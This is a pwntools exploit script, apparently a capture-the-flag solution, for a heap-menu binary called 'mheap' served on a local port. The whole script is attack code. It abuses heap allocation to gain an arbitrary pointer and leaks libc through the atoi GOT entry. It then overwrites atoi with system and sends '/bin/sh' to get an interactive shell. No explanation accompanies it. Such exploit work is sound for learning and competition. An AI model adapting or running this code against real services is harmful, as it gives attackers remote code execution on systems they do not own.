from pwn import *

#context.log_level='debug'
# p=process('./mheap')
p=remote('127.0.0.1',10001)
elf=ELF('./mheap',checksec=False)
libc=ELF('libc-2.27.so')

def Add(idx,size,data):
    p.sendlineafter('choice: ','1')
    p.sendlineafter('Index: ',str(idx))
    p.sendlineafter('size: ',str(size))
    p.sendafter('Content: ',data)

def Del(idx):
    p.sendlineafter('choice: ','3')
    p.sendlineafter('Index: ',str(idx))

def Show(idx):
    p.sendlineafter('choice: ','2')
    p.sendlineafter('Index: ',str(idx))

def Edit(idx,data):
    p.sendlineafter('choice: ','4')
    p.sendlineafter('Index: ',str(idx))
    p.send(data)

heap_list=0x00000000004040E0
prev_chunk_list=0x00000000004040D0
atoi_got=elf.got['atoi']
Add(0,0xfb0,'\xaa'*0x20+'\n')
Add(1,0x10,'\xbb'*0x10)
Del(1)
Add(2,0x40,p64(prev_chunk_list)+'\x00'*0x2f+'\n')
Add(3,0x0000000023330fc0-0x10,p64(atoi_got)+'\n')
Show(0)
libc_addr=u64(p.recv(6).ljust(8,'\0'))-libc.sym['atoi']
system=libc.sym['system']+libc_addr
success('libc_addr:'+hex(libc_addr))
success('system:'+hex(system))
Edit(0,p64(system))
p.sendline('/bin/sh')

p.interactive()
